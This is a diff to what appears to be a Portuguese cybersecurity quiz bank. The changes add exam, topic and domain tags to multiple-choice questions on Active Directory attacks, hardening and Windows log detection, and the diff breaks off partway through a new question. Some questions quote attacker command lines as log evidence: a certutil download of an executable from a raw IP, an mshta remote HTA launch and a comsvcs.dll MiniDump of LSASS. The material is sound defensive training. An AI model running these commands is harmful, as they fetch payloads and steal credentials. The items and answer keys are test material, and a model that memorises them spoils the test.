         "explanation": "O allowlisting permite binários conhecidos como bons; LOLBins que continuam de confiança ainda podem obter ou lançar código do atacante, por isso a defesa precisa de regras mais estritas e controlo de scripts. O WDAC não proíbe todos os binários Microsoft, não expõe uma lista de bypass em texto limpo nem confia automaticamente em downloads HTTP.",
-        "difficulty": "Difícil"
+        "difficulty": "Difícil",
+        "exam": "scor",
+        "topic": "endpoint",
+        "domain": "5.1"
       },
       {
         "question": "Durante uma migração de floresta, uma conta mantém um SID antigo de elevado privilégio no SID History. Porque é isso perigoso através de uma trust entre florestas, e o que o mitiga?",
@@ -18003,7 +18303,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 3,
         "explanation": "O SID History pode transportar SIDs de grupos para o token de acesso; através de uma trust entre florestas isso pode elevar privilégios a menos que o SID filtering (quarantine) remova SIDs inesperados. Não é cosmético, não é só um downgrade de cifra, e não é sempre removido em todas as trusts.",
-        "difficulty": "Médio"
+        "difficulty": "Médio",
+        "exam": "scor",
+        "topic": "identidade",
+        "domain": "6.1"
       },
       {
         "question": "Numa avaliação AD encontra Groups.xml no SYSVOL que ainda contém o atributo cpassword de Group Policy Preferences antigas. Porque é isso ainda útil para um atacante hoje?",
@@ -18015,7 +18318,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 1,
         "explanation": "As GPP guardavam passwords com uma chave AES bem conhecida (era MS14-025). Valores cpassword legíveis no SYSVOL desencriptam offline para texto claro. Não é um mero HMAC, não se limita a um SID local, e os DC não removem automaticamente todas as cópias antigas.",
-        "difficulty": "Médio"
+        "difficulty": "Médio",
+        "exam": "cbrops",
+        "topic": "identidade",
+        "domain": "3.2"
       },
       {
         "question": "Na cadeia de ataque noPac (CVE-2021-42278 / CVE-2021-42287) contra Active Directory, que combinação permite a um utilizador de baixo privilégio escalar rumo a direitos de domain admin?",
@@ -18027,7 +18333,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 3,
         "explanation": "O noPac encadeia spoofing de sAMAccountName (parecer um DC sem $) com o tratamento Kerberos de TGT/TGS para o PAC ser emitido pelo DC impersonado. Não é um flip simples de HKLM por qualquer utilizador, não é só LLMNR para Silver Ticket, e não é PrintNightmare numa workstation.",
-        "difficulty": "Difícil"
+        "difficulty": "Difícil",
+        "exam": "cbrops",
+        "topic": "identidade",
+        "domain": "2.8"
       },
       {
         "question": "Um atacante obtém a password do Directory Services Restore Mode (DSRM) de um controlador de domínio. Em que situação essa credencial se torna especialmente perigosa para persistência ou abuso de recuperação?",
@@ -18039,7 +18348,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 0,
         "explanation": "O DSRM é o equivalente local ao Administrator no SAM do DC. Com DsrmAdminLogonBehavior a permitir logon com o AD DS a correr, é um segredo de emergência duradouro independente da rotação normal de contas de domínio. Não se torna krbtgt, não vira Global Admin Azure sozinho, e o Credential Guard não inventa essa propriedade.",
-        "difficulty": "Médio"
+        "difficulty": "Médio",
+        "exam": "cbrops",
+        "topic": "identidade",
+        "domain": "2.8"
       },
       {
         "question": "Um principal no grupo DNSAdmins pode carregar uma DLL pelo caminho de plugin de nível de servidor do DNS Server. Porque é que isso é frequentemente tratado como caminho de elevação de privilégios até ao Domain Controller?",
@@ -18051,7 +18363,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 3,
         "explanation": "Em muitos DCs o serviço DNS Server corre como SYSTEM. Membros de DNSAdmins podem configurar uma DLL de plugin de nível de servidor que o dns.exe carrega, obtendo execução SYSTEM e um caminho para Domain Admin. DNSAdmins não é Domain Admin por si; o risco é o contexto privilegiado do serviço, não um truque de tarefa agendada nem um portão SeDebugPrivilege que bloqueie por completo o DNSAdmins.",
-        "difficulty": "Médio"
+        "difficulty": "Médio",
+        "exam": "cbrops",
+        "topic": "identidade",
+        "domain": "3.2"
       },
       {
         "question": "Numa avaliação AD queres a password actual de uma group Managed Service Account (gMSA). Que atributo / caminho de API se usa tipicamente para obter o blob da password gerida pelos principals autorizados?",
@@ -18063,7 +18378,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 0,
         "explanation": "As passwords gMSA obtêm-se pelos principals autorizados através do atributo construído msDS-ManagedPassword (muitas vezes via LDAP), não de um userPassword em claro legível por todos, não via NetUserGetInfo para qualquer utilizador do domínio, nem por binds anónimos a UnicodePwd. Quem está em PrincipalsAllowedToRetrieveManagedPassword (ou direitos equivalentes) controla quem recebe o blob.",
-        "difficulty": "Difícil"
+        "difficulty": "Difícil",
+        "exam": "cbrops",
+        "topic": "identidade",
+        "domain": "2.8"
       },
       {
         "question": "Porque é que os guias de hardening pedem LDAP signing e LDAP channel binding nos domain controllers?",
@@ -18075,7 +18393,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 2,
         "explanation": "O LDAP signing garante a integridade das mensagens LDAP; o channel binding associa a troca LDAP ao canal TLS por baixo, tornando um bind retransmitido (relay) mais difícil. Não substituem Kerberos por NTLM, não firewallam sozinhos a 389 e não param sozinhos o BloodHound quando já existe credencial de utilizador.",
-        "difficulty": "Médio"
+        "difficulty": "Médio",
+        "exam": "scor",
+        "topic": "identidade",
+        "domain": "2.3"
       },
       {
         "question": "Uma conta de administrador é adicionada ao grupo 'Protected Users' do Active Directory. Que efeito tem essa pertença?",
@@ -18087,7 +18408,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 1,
         "explanation": "O Protected Users endurece as contas membro: sem NTLM, sem DES nem RC4 na pré-autenticação Kerberos, sem delegação (constrained ou unconstrained), sem credenciais em claro em cache via CredSSP/WDigest, e um TGT de 4 horas não renovável. Não tira o bloqueio, não apaga hashes dos DCs nem força logons por jump server. Destina-se a contas de utilizador, não a contas de serviço ou de computador.",
-        "difficulty": "Médio"
+        "difficulty": "Médio",
+        "exam": "scor",
+        "topic": "identidade",
+        "domain": "6.1"
       },
       {
         "question": "Num ataque 'Timeroasting', um atacante sem autenticação envia pedidos de hora MS-SNTP a um controlador de domínio. O que ganha, e quando é que isso é perigoso?",
@@ -18099,7 +18423,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 2,
         "explanation": "No MS-SNTP, o DC assina as respostas de hora com uma chave derivada do hash NT da conta de computador cujo RID vem no pedido. Um atacante pode pedir muitos RIDs sem se autenticar e quebrar os resultados offline. Atinge sobretudo contas de computador com palavras-passe fracas ou definidas à mão (por exemplo contas pré-criadas ou 'pre-Windows 2000'); as palavras-passe de máquina normais, rodadas automaticamente, são praticamente inquebráveis. Não revela o krbtgt, não muda o relógio do DC nem lista logons.",
-        "difficulty": "Difícil"
+        "difficulty": "Difícil",
+        "exam": "cbrops",
+        "topic": "identidade",
+        "domain": "2.8"
       },
       {
         "question": "No modelo de administração por níveis (tiers) do Active Directory, qual é a regra central para as contas de administração Tier 0?",
@@ -18111,7 +18438,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 0,
         "explanation": "O Tier 0 cobre o plano de controlo da identidade: controladores de domínio, AD CS, AD FS, servidores de sincronização e os seus administradores. Essas credenciais só se usam em sistemas Tier 0; entrar num servidor Tier 1 ou num posto Tier 2 deixa lá hashes ou tickets para um atacante roubar. O trabalho de rotina nos endpoints é para contas de nível inferior, contas de admin partilhadas destroem a responsabilização e a MFA no login não impede que as credenciais fiquem em memória.",
-        "difficulty": "Médio"
+        "difficulty": "Médio",
+        "exam": "scor",
+        "topic": "identidade",
+        "domain": "1.9"
       },
       {
         "question": "Porque é que os guias de hardening do AD recomendam pôr o ms-DS-MachineAccountQuota a 0 no domínio?",
@@ -18123,7 +18453,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 2,
         "explanation": "O ms-DS-MachineAccountQuota vem a 10 por omissão, por isso qualquer utilizador autenticado pode criar até 10 contas de computador. Uma conta de máquina controlada pelo atacante (com palavra-passe e SPN conhecidos) é um passo chave em ataques como abuso de resource-based constrained delegation, noPac e algumas cadeias de relay. Pô-lo a 0 e delegar a junção ao domínio num grupo próprio retira esse ponto de apoio. Não afeta o logon nos DCs, a replicação nem Kerberos versus NTLM.",
-        "difficulty": "Médio"
+        "difficulty": "Médio",
+        "exam": "scor",
+        "topic": "identidade",
+        "domain": "2.5"
       },
       {
         "question": "Numa zona DNS integrada no AD, um atacante só com uma conta normal de utilizador do domínio cria um registo wildcard (*) que aponta para o seu IP. O que consegue com isso?",
@@ -18135,7 +18468,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 1,
         "explanation": "Por omissão os utilizadores autenticados podem criar registos novos nas zonas DNS integradas no AD (ADIDNS). Um registo wildcard responde por qualquer nome que ainda não exista, por isso gralhas e hostnames desativados resolvem para o atacante, que pode capturar ou reencaminhar autenticação NTLM, como no envenenamento LLMNR/NBT-NS mas em todo o domínio. Os registos existentes, como os A dos DCs, não são substituídos, e transferências de zona e DNSSEC são definições à parte. Mitiga-se limitando a criação de registos e criando antecipadamente um registo wildcard.",
-        "difficulty": "Difícil"
+        "difficulty": "Difícil",
+        "exam": "cbrops",
+        "topic": "ameacas",
+        "domain": "2.5"
       },
       {
         "question": "O que faz principalmente ativar a proteção LSA (RunAsPPL) num host Windows?",
@@ -18147,7 +18483,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 3,
         "explanation": "A proteção LSA corre o lsass.exe como Protected Process Light (PPL). Processos não protegidos, mesmo com direitos de admin e SeDebugPrivilege, não o conseguem abrir para ler memória nem injetar código, e só carregam plugins LSA assinados, o que trava ferramentas como o sekurlsa do Mimikatz sem um driver de kernel. Isolar segredos numa VM protegida pelo hypervisor é o Credential Guard; não cifra a SAM com o TPM nem desliga o NTLM.",
-        "difficulty": "Médio"
+        "difficulty": "Médio",
+        "exam": "scor",
+        "topic": "endpoint",
+        "domain": "5.1"
       },
       {
         "question": "Porque é que os guias de hardening pedem muitas vezes que o SMB signing seja obrigatório nos clientes e servidores Windows?",
@@ -18159,7 +18498,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 1,
         "explanation": "O SMB signing usa a chave de sessão para proteger a integridade das mensagens SMB. Depois de um relay NTLM, o atacante não tem essa chave, por isso um servidor que exija signing rejeita a sessão SMB reencaminhada. Signing não é encriptação completa dos ficheiros, não substitui por si o NTLM por Kerberos e é independente de desligar sessões guest/null.",
-        "difficulty": "Médio"
+        "difficulty": "Médio",
+        "exam": "scor",
+        "topic": "rede-cloud",
+        "domain": "2.3"
       },
       {
         "question": "O que consegue principalmente o Microsoft LAPS (Local Administrator Password Solution) nas máquinas Windows juntas ao domínio?",
@@ -18171,7 +18513,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 3,
         "explanation": "O LAPS (e o Windows LAPS) dá a cada PC do domínio uma palavra-passe aleatória diferente para o Administrator local, guardada no Active Directory (ms-Mcs-AdmPwd ou os atributos novos do Windows LAPS) e legível só pelos grupos que delegares. Isso trava o movimento lateral que reutilizava uma palavra-passe de admin local em muitas máquinas. Não é uma palavra-passe única da OU numa GPO, não substitui o admin local por gMSA e não é o Credential Guard.",
-        "difficulty": "Médio"
+        "difficulty": "Médio",
+        "exam": "scor",
+        "topic": "endpoint",
+        "domain": "5.2"
       },
       {
         "question": "Depois de um incidente com suspeita de golden ticket, porque é que os guias de recuperação pedem para repor a palavra-passe da conta krbtgt duas vezes, com replicação pelo meio?",
@@ -18183,7 +18528,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 0,
         "explanation": "Um golden ticket é um TGT forjado assinado com um hash da palavra-passe do krbtgt. O AD lembra as chaves krbtgt actual e anterior para desencriptar tickets, por isso uma só reposição ainda deixa a chave antiga válida. Repor duas vezes (à espera da replicação após cada uma) reformula as duas chaves e invalida tickets forjados com qualquer delas. Não se trata de apagar/recriar a conta, de cache no LSASS entre reboots, nem de uma terceira reposição obrigatória em todas as florestas.",
-        "difficulty": "Difícil"
+        "difficulty": "Difícil",
+        "exam": "cbrops",
+        "topic": "logs-ir",
+        "domain": "5.3"
       },
       {
         "question": "Porque é que os guias de hardening do Active Directory recomendam que os admins de domínio trabalhem a partir de uma Privileged Access Workstation (PAW)?",
@@ -18195,7 +18543,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 0,
         "explanation": "Uma PAW é uma estação de trabalho endurecida reservada à administração privilegiada, sem email, navegação nem aplicações gerais. Se os admins só iniciarem sessão aí, as credenciais de alto valor nunca ficam expostas em máquinas do dia-a-dia onde phishing ou malware as possam roubar. Não move palavras-passe para o TPM para mudar a forma como os DC aceitam logons, não funciona como DC e não há regra de nome de máquina.",
-        "difficulty": "Médio"
+        "difficulty": "Médio",
+        "exam": "scor",
+        "topic": "identidade",
+        "domain": "1.9"
       },
       {
         "question": "O que é que o PowerShell Just Enough Administration (JEA) oferece principalmente num servidor Windows?",
@@ -18207,7 +18558,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 2,
         "explanation": "O JEA publica um endpoint de remoting PowerShell cujas role capabilities indicam exactamente que cmdlets, funções e parâmetros cada grupo pode usar. Os comandos correm normalmente com uma conta virtual temporária ou uma conta gerida de grupo, por isso o helpdesk pode, por exemplo, reiniciar um serviço sem ser admin local. Não é uma política de assinatura, não é uma entrada temporária no grupo Administrators e continua a usar WinRM.",
-        "difficulty": "Médio"
+        "difficulty": "Médio",
+        "exam": "scor",
+        "topic": "identidade",
+        "domain": "6.2"
       },
       {
         "question": "No Active Directory activas o Kerberos armoring (FAST, Flexible Authentication Secure Tunneling) nos clientes e DC. O que é que acrescenta principalmente?",
@@ -18219,7 +18573,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 1,
         "explanation": "O FAST cria um túnel blindado para a troca AS-REQ/AS-REP usando uma chave do TGT da conta de computador. Isso protege os dados de pré-autenticação do utilizador contra adivinhação offline da palavra-passe, permite ao KDC enviar erros assinados que não podem ser forjados e suporta compound claims para o Dynamic Access Control. Não muda as cifras dos service tickets, não exige smart cards e não altera a forma como as contas Protected Users recebem TGTs.",
-        "difficulty": "Difícil"
+        "difficulty": "Difícil",
+        "exam": "scor",
+        "topic": "identidade",
+        "domain": "1.5"
       },
       {
         "question": "Uma equipa de segurança ativa a regra Attack Surface Reduction (ASR) do Microsoft Defender 'Block all Office applications from creating child processes'. Que ataque é que esta regra trava principalmente?",
@@ -18231,7 +18588,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 1,
         "explanation": "Muitas campanhas de malware começam com um documento cuja macro ou exploit faz o Word ou o Excel lançar PowerShell, cmd.exe, wscript ou outro binário para ir buscar o payload. Esta regra ASR impede as apps Office de criar processos filhos, partindo essa cadeia mesmo que o utilizador ative as macros. Não filtra links de phishing, não protege ficheiros contra ransomware (isso é o Controlled Folder Access) e não tem nada a ver com chaves de licença.",
-        "difficulty": "Médio"
+        "difficulty": "Médio",
+        "exam": "scor",
+        "topic": "endpoint",
+        "domain": "5.1"
       },
       {
         "question": "Porque é que os guias de hardening de Active Directory tratam ser membro do grupo integrado Backup Operators nos controladores de domínio como quase igual a Domain Admin?",
@@ -18243,7 +18603,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 3,
         "explanation": "Os Backup Operators têm SeBackupPrivilege e SeRestorePrivilege e podem iniciar sessão nos controladores de domínio. O privilégio de backup passa por cima das ACLs dos ficheiros, por isso um membro pode copiar o NTDS.dit (por exemplo de uma shadow copy) e a hive SYSTEM e depois extrair offline os hashes de todas as contas, krbtgt incluída. Por isso o grupo pertence ao Tier 0 e normalmente deve estar vazio. Não entra nos Enterprise Admins, não repõe palavras-passe às escondidas nem dá SYSTEM nos postos.",
-        "difficulty": "Difícil"
+        "difficulty": "Difícil",
+        "exam": "scor",
+        "topic": "identidade",
+        "domain": "6.1"
       },
       {
         "question": "Num controlador de domínio, que padrão de registos é um sinal comum de Kerberoasting num ambiente que normalmente usa AES no Kerberos?",
@@ -18255,7 +18618,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 0,
         "explanation": "No Kerberoasting o atacante pede ao KDC tickets de serviço para contas com SPN e quebra-os offline; pedir RC4 torna a quebra muito mais rápida. Num DC isto aparece como evento 4769 com Ticket Encryption Type 0x17, muitas vezes uma rajada de um utilizador para muitos SPNs. Rajadas de 4625 apontam para password spraying ou força bruta, 4720 com mudanças de grupo para persistência, e 1102 para alguém a apagar rastos.",
-        "difficulty": "Médio"
+        "difficulty": "Médio",
+        "exam": "cbrops",
+        "topic": "logs-ir",
+        "domain": "3.5"
       },
       {
         "question": "Um analista suspeita de movimento lateral ao estilo PsExec para um servidor de ficheiros. Que registo nesse servidor é o sinal clássico?",
@@ -18267,7 +18633,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 2,
         "explanation": "O PsExec copia um binário de serviço para a partilha ADMIN$ do alvo e cria um serviço (PSEXESVC por omissão) para correr comandos, por isso o alvo regista o evento de sistema 7045, mais o evento de segurança 4697 se a auditoria estiver ativa, junto a um logon de rede tipo 3 vindo da origem. Serviços com outro nome mostram o mesmo padrão. O PsExec usa SMB na porta 445, não RDP, e não precisa de logons falhados nem bloqueia a consola.",
-        "difficulty": "Médio"
+        "difficulty": "Médio",
+        "exam": "cbrops",
+        "topic": "logs-ir",
+        "domain": "3.5"
       },
       {
         "question": "Atacantes numa rede correm PowerShell muito ofuscado (Base64 e concatenação de strings). Que funcionalidade de registo do Windows mostra melhor aos defensores o código que correu de facto?",
@@ -18279,7 +18648,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 1,
         "explanation": "O Script Block Logging (evento 4104 em Microsoft-Windows-PowerShell/Operational) regista o código de cada bloco de script quando o PowerShell o compila, por isso Base64 ou strings concatenadas aparecem já descodificadas, e o Windows regista automaticamente blocos com ar suspeito mesmo com a política desligada. A transcrição é útil mas guarda a entrada e saída da consola, não o script descodificado. Os registos da firewall e de logons Kerberos não contêm o código PowerShell.",
-        "difficulty": "Médio"
+        "difficulty": "Médio",
+        "exam": "cbrops",
+        "topic": "logs-ir",
+        "domain": "3.5"
       },
       {
         "question": "Num posto com Sysmon, que evento é o sinal mais direto de que uma ferramenta como o Mimikatz está a tentar ler credenciais da memória?",
@@ -18291,7 +18663,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 3,
         "explanation": "As ferramentas que extraem credenciais abrem um handle para o lsass.exe com direitos de leitura de memória. O Sysmon Event ID 10 (ProcessAccess) regista o processo de origem, o alvo e a máscara GrantedAccess, e máscaras como 0x1010 ou 0x1410 vindas de um processo que não tem nada a ver com o LSASS são uma deteção clássica. O LSASS não envia hashes pela rede, os ficheiros .kirbi são exportações opcionais de tickets guardadas onde o atacante quiser e todos os processos carregam o ntdll.dll.",
-        "difficulty": "Difícil"
+        "difficulty": "Difícil",
+        "exam": "cbrops",
+        "topic": "logs-ir",
+        "domain": "3.5"
       },
       {
         "question": "A conta de domínio de um utilizador bloqueia de poucos em poucos minutos, mesmo depois de mudar a password. Onde procuras primeiro para descobrir que máquina está a enviar as passwords erradas?",
@@ -18303,7 +18678,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 1,
         "explanation": "As tentativas com password errada são reencaminhadas para o PDC emulator, que bloqueia a conta e regista o evento 4740 com o Caller Computer Name. Esse host costuma ter uma password antiga guardada: uma unidade mapeada, a app de email de um telemóvel, uma tarefa agendada ou um serviço. Se precisares, segue com as falhas 4771 ou 4776 nos DCs. O 4625 é um logon falhado na máquina de destino, o 4720 é a criação de uma conta e o 4624 é um logon com sucesso.",
-        "difficulty": "Médio"
+        "difficulty": "Médio",
+        "exam": "ccst-cyber",
+        "topic": "logs-ir",
+        "domain": "3.5"
       },
       {
         "question": "Suspeitas de um ataque DCSync. Com a auditoria de Directory Service Access ligada, que evento do controlador de domínio mostra isso melhor?",
@@ -18315,7 +18693,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 2,
         "explanation": "O DCSync usa o protocolo de replicação do diretório (MS-DRSR) para pedir dados de passwords a um DC, como faria um DC verdadeiro. Com a auditoria ligada, o DC regista o 4662 no objeto do domínio com os direitos de replicação Get-Changes (1131f6aa-...) e Get-Changes-All (1131f6ad-...). Só os DCs, e às vezes ferramentas como o Azure AD Connect, devem fazer isso, por isso o mesmo pedido vindo de uma conta de utilizador ou de um posto é um forte sinal. O DCSync não altera objetos, não pede tickets do krbtgt nem causa bloqueios.",
-        "difficulty": "Difícil"
+        "difficulty": "Difícil",
+        "exam": "cbrops",
+        "topic": "logs-ir",
+        "domain": "3.5"
       },
       {
         "question": "À procura de AS-REP roasting, que detalhe nos registos do controlador de domínio é a pista mais forte?",
@@ -18327,7 +18708,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 0,
         "explanation": "No AS-REP roasting o atacante pede um TGT para contas que não precisam de pré-autenticação Kerberos; o KDC responde com dados cifrados com a chave do utilizador, que depois são quebrados offline. O DC regista o 4768 com Pre-Authentication Type 0. Encontra essas contas com PowerShell (DoesNotRequirePreAuth) e desliga a opção. O 4769 com 0x17 aponta para Kerberoasting, e o ataque não precisa de RDP nem de adivinhar passwords online.",
-        "difficulty": "Médio"
+        "difficulty": "Médio",
+        "exam": "cbrops",
+        "topic": "logs-ir",
+        "domain": "3.5"
       },
       {
         "question": "Numa workstation encontras o evento 4698 às 03:12, criado por uma conta de utilizador que nunca entra à noite. O novo item corre o powershell.exe com um comando codificado de 15 em 15 minutos. O que é que isto mostra, muito provavelmente?",
@@ -18339,7 +18723,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 3,
         "explanation": "O evento 4698 é registado quando uma tarefa agendada é criada (com a auditoria Other Object Access Events ligada) e inclui o XML da tarefa com a ação que corre. Uma tarefa criada de noite por uma conta invulgar que lança PowerShell codificado de poucos em poucos minutos é uma técnica clássica de persistência. As tarefas do Windows Update são tarefas de sistema assinadas, os logons falhados são o 4625 e as reposições de password o 4724.",
-        "difficulty": "Médio"
+        "difficulty": "Médio",
+        "exam": "cbrops",
+        "topic": "logs-ir",
+        "domain": "3.5"
       },
       {
         "question": "O EDR alerta que HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest\\UseLogonCredential foi posto a 1 num servidor Windows 10. Porque é que isto é um sinal de alarme sério?",
@@ -18351,7 +18738,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 2,
         "explanation": "Desde o Windows 8.1 e o Server 2012 R2, o WDigest deixou de guardar credenciais em texto claro no LSASS. Pôr o UseLogonCredential a 1 volta a ligar isso, por isso, depois de os utilizadores entrarem outra vez, uma ferramenta como o Mimikatz consegue extrair as passwords em texto claro. Os atacantes alteram-no para preparar o roubo de credenciais. Alerta para a mudança, repõe o 0 e procura acessos ao LSASS. Não tem nada a ver com o NTLMv2, o Defender ou mudanças forçadas de password.",
-        "difficulty": "Difícil"
+        "difficulty": "Difícil",
+        "exam": "cbrops",
+        "topic": "endpoint",
+        "domain": "3.5"
       },
       {
         "question": "Os registos de processos de um PC mostram: certutil.exe -urlcache -split -f http://203.0.113.50/a.txt C:\\Users\\Public\\a.exe. Ninguém da equipa de IT gere certificados nesse PC. Como deves interpretar isto?",
@@ -18363,7 +18753,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 1,
         "explanation": "O certutil é um binário assinado do Windows para certificados, mas '-urlcache -split -f <url> <ficheiro>' põe-no a descarregar qualquer ficheiro. Os atacantes usam-no para trazer payloads sem precisarem de um downloader próprio, por isso é um LOLBin bem conhecido. Um .txt vindo de um IP direto e gravado como .exe em C:\\Users\\Public é um forte sinal de preparação de malware: isola o host, recolhe o ficheiro e verifica o hash. As verificações de CRL não gravam executáveis e o Windows Update não usa o certutil.",
-        "difficulty": "Médio"
+        "difficulty": "Médio",
+        "exam": "cbrops",
+        "topic": "logs-ir",
+        "domain": "3.5"
       },
       {
         "question": "Durante a investigação de um servidor de ficheiros, o registo Security começa hoje às 02:47 com o evento 1102 e não há nada mais antigo. Nenhum administrador tinha manutenção planeada. O que é que isto te diz?",
@@ -18375,7 +18768,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 1,
         "explanation": "O evento 1102 significa que o registo de auditoria foi limpo e indica a conta que o fez. Sem trabalho planeado, um registo Security apagado é um passo clássico de anti-forense, por isso verifica que conta o limpou e consulta as cópias já enviadas para o SIEM ou para um coletor de registos. Um registo cheio ou escreve por cima dos eventos antigos ou arquiva-os sem 1102, e o arranque dos serviços fica registado com outros eventos no registo System.",
-        "difficulty": "Médio"
+        "difficulty": "Médio",
+        "exam": "cbrops",
+        "topic": "logs-ir",
+        "domain": "3.4"
       },
       {
         "question": "O Sysmon mostra isto num servidor: rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 712 C:\\Temp\\d.bin full. O processo 712 é o lsass.exe. Como deves tratar isto?",
@@ -18387,7 +18783,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 2,
         "explanation": "O comsvcs.dll exporta uma função MiniDump e, chamada pelo rundll32 com o ID do processo LSASS, grava um dump completo da memória do LSASS. Ferramentas como o Mimikatz conseguem depois tirar desse ficheiro hashes de passwords e tickets Kerberos offline. É uma técnica living-off-the-land bem conhecida, por isso isola o host, considera expostas as credenciais de quem tinha sessão aberta e liga a proteção LSA (RunAsPPL) e o Credential Guard. O Windows Error Reporting usa as suas próprias ferramentas e o Defender não analisa através do rundll32.",
-        "difficulty": "Difícil"
+        "difficulty": "Difícil",
+        "exam": "cbrops",
+        "topic": "logs-ir",
+        "domain": "3.5"
       },
       {
         "question": "Num controlador de domínio vês o evento 4720 para uma conta nova 'svc_backup2' às 23:40 e, dois minutos depois, o evento 4732 a adicioná-la ao grupo local Administrators. Ninguém abriu um pedido para isso. Qual é a leitura certa?",
@@ -18399,7 +18798,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 0,
         "explanation": "O evento 4720 significa que foi criada uma conta de utilizador e o 4732 que foi adicionado um membro a um grupo local com segurança ativa, aqui o Administrators. Uma conta nova com nível de administrador criada à noite sem pedido de alteração é uma jogada típica de persistência, por isso encontra o criador nos detalhes do evento, desativa a conta e verifica os logons e as ações dela. O Windows Server Backup não cria contas, o password spraying aparece como logons falhados como o 4625 ou o 4771, e nenhum dos eventos tem a ver com arquivo.",
-        "difficulty": "Médio"
+        "difficulty": "Médio",
+        "exam": "cbrops",
+        "topic": "logs-ir",
+        "domain": "3.5"
       },
       {
         "question": "Em dez minutos um controlador de domínio regista o evento 4771 com código de falha 0x18 para 300 contas diferentes, uma ou duas tentativas cada, todas a partir do IP do mesmo posto. Qual é a atividade mais provável?",
@@ -18411,7 +18813,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 2,
         "explanation": "O evento 4771 é uma falha de pré-autenticação Kerberos e o código 0x18 indica palavra-passe errada. Muitas contas com só uma ou duas tentativas cada, vindas de uma única origem, é o padrão de password spraying, que fica abaixo do limite de bloqueio. O desvio de relógio aparece como código 0x25, um dia de mudança de palavra-passe não vem de um só IP e uma unidade mapeada presa repete uma conta, não centenas.",
-        "difficulty": "Médio"
+        "difficulty": "Médio",
+        "exam": "cbrops",
+        "topic": "logs-ir",
+        "domain": "3.5"
       },
       {
         "question": "O EDR mostra o WINWORD.EXE a arrancar 'mshta.exe http://203.0.113.50/inv.hta' no portátil de um utilizador, seguido de um processo PowerShell com um comando codificado. Qual é a melhor leitura e a primeira resposta?",
@@ -18423,7 +18828,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 1,
         "explanation": "O mshta.exe corre HTML Applications com plenos direitos de script, e um HTA remoto lançado pelo Word seguido de PowerShell codificado é uma cadeia clássica de macro maliciosa. Isola o equipamento, bloqueia o endereço e ativa a regra ASR que impede as apps do Office de criar processos filho. Os modelos do Word não vêm pelo mshta, o visualizador de ajuda é o hh.exe e a verificação de assinaturas não lança PowerShell.",
-        "difficulty": "Difícil"
+        "difficulty": "Difícil",
+        "exam": "cbrops",
+        "topic": "logs-ir",
+        "domain": "5.3"
       },
       {
         "question": "Num servidor de ficheiros, o evento 4648 mostra que o utilizador dos RH 'mrosa' correu um processo com as credenciais explícitas de 'adm-backup', um Domain Admin, e depois ligou-se ao C$ de dez servidores em poucos minutos. O que deve concluir o analista?",
@@ -18435,7 +18843,2500 @@ window.QUIZ_BANK = {
         ],
         "correct": 3,
         "explanation": "O evento 4648 regista um login tentado com credenciais explícitas, como no runas ou no 'net use /user'. Um utilizador dos RH a usar uma conta Domain Admin e a mexer em partilhas administrativas de vários servidores aponta para credenciais roubadas usadas em movimento lateral. Desativa ou repõe a 'adm-backup', delimita os equipamentos onde chegou e verifica o portátil dos RH. O 4648 não é escrito em todos os logins, os serviços de backup não correm em sessões de utilizador e o UAC nunca te troca para outra conta.",
-        "difficulty": "Médio"
+        "difficulty": "Médio",
+        "exam": "cbrops",
+        "topic": "logs-ir",
+        "domain": "3.5"
+      },
+      {
+        "question": "Que opção lista as três propriedades da tríade CIA?",
+        "options": [
+          "Confidencialidade, Integridade, Disponibilidade",
+          "Controlo, Identidade, Acesso sem ferramentas adicionais",
+          "Conformidade, Isolamento, Auditoria",
+          "Criptografia, Integridade, Autorização"
+        ],
+        "correct": 0,
+        "explanation": "A tríade CIA é Confidencialidade, Integridade e Disponibilidade, os três objetivos centrais que os controlos de segurança protegem.",
+        "difficulty": "Fácil",
+        "exam": "ccst-cyber",
+        "topic": "risco",
+        "domain": "1.1"
+      },
+      {
+        "question": "Qual é a ideia principal de uma estratégia de defesa em profundidade?",
+        "options": [
+          "Confiar numa única firewall de perímetro forte para toda a proteção",
+          "Usar vários controlos em camadas para que uma falha não exponha tudo",
+          "Cifrar todos os dados e ignorar os controlos de acesso físico",
+          "Dar direitos de administrador a todos os utilizadores para facilitar o suporte"
+        ],
+        "correct": 1,
+        "explanation": "A defesa em profundidade empilha controlos independentes (rede, host, aplicação, físico, política) para que a falha de uma camada não comprometa todo o sistema.",
+        "difficulty": "Fácil",
+        "exam": "ccst-cyber",
+        "topic": "risco",
+        "domain": "1.1"
+      },
+      {
+        "question": "Uma mensagem leva um colaborador a deixar um desconhecido entrar atrás de si por uma porta com cartão. Que ataque é este?",
+        "options": [
